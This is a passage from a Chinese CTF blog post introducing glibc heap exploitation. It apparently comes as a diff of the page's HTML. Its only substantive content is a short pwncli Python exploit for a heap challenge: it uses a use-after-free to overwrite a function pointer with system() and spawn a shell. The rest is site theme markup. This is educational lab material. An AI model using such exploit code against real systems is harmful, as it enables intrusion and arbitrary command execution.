+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br>cli_script()<br><br><br>io: tube = gift.io<br>elf: ELF = gift.elf<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">i, prompt</span>):<br>    sla(prompt, i)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>    cmd(<span class="hljs-string">b&quot;1&quot;</span>,<span class="hljs-string">b&quot;:&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>	sla(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>	sla(<span class="hljs-string">b&#x27;page&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>	sla(<span class="hljs-string">b&#x27;strings&#x27;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>	sla(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>	sla(<span class="hljs-string">b&#x27;page&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params">index</span>):<br>	sla(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>	sla(<span class="hljs-string">b&#x27;page&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br>add() <span class="hljs-comment">#index 0</span><br>dele(<span class="hljs-number">0</span>)<br>add() <span class="hljs-comment">#index 1</span><br>edit(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;sh\x00\x00&#x27;</span> + p32(elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br>show(<span class="hljs-number">0</span>)<br><br>ia()<br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Heap/" class="print-no-link">#Heap</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Glibc堆利用入门</div>
+      <div>http://nanhang.top/2025/07/01/ctf/heap/heap/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>南行</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年7月1日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/07/01/fuzz/paper/seed/" title="论文笔记：Harnessing Large Language Models for Seed Generation in Greybox Fuzzing">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">论文笔记：Harnessing Large Language Models for Seed Generation in Greybox Fuzzing</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/07/01/fuzz/paper/llamafuzz/" title="论文笔记：LLAMAFUZZ: Large Language Model Enhanced Greybox Fuzzing">
+                        <span class="hidden-mobile">论文笔记：LLAMAFUZZ: Large Language Model Enhanced Greybox Fuzzing</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+  <script>
+  Fluid.utils.createScript('https://lib.baomitu.com/mermaid/8.14.0/mermaid.min.js', function() {
+    mermaid.initialize({"theme":"default"});
+
+    Fluid.utils.listenDOMLoaded(function() {
+      Fluid.events.registerRefreshCallback(function() {
+        if ('mermaid' in window) {
+          mermaid.init();
+        }
+      });
+    });
+  });
+</script>
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
